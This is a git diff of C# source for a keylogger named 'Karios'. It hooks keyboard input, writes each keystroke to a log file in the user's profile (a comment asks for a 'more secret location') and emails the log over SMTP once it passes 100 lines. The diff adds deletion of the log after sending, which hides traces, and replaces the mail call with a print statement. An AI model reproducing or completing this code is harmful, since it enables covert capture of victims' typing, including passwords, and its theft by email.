@@ -237,7 +237,7 @@ namespace Karios
                 var fileName = DateTime.Now.ToString("yyyy-MM-dd");
                 var machineName = Environment.MachineName;
                 // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName +""+ machineName + ".txt"; // TODO - get more secret location.
+                pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + "" +  machineName + ".txt"; // TODO - get more secret location.
                 var sw = new StreamWriter(pathToLog, true);
                 if ((Keys)vkCode != Keys.Enter)
                 {
@@ -256,18 +256,17 @@ namespace Karios
                     Console.WriteLine((Keys)vkCode);
                 }
                 sw.Close();
-                Console.WriteLine("Closed");
+                //Console.WriteLine("Closed");
             }
             catch
             {
                 Console.WriteLine("Something went wrong, im dieing");
             }  
-            Console.WriteLine("Trying to send emailsss");
 
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
                 {
-                    SendMail();
+                    Console.WriteLine("Its sending!");
                 }
             }
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
@@ -317,7 +316,7 @@ namespace Karios
             */
         }
 
-        public static void SendMail()
+        async Task SendMail_Aysnc()
         {
             try
             {
@@ -351,6 +350,7 @@ namespace Karios
                 smtpServer.Send(mail);
                 //clear mail attachment
                 attachment.Dispose();
+                File.Delete(pathToLog);
             }
             catch
             {
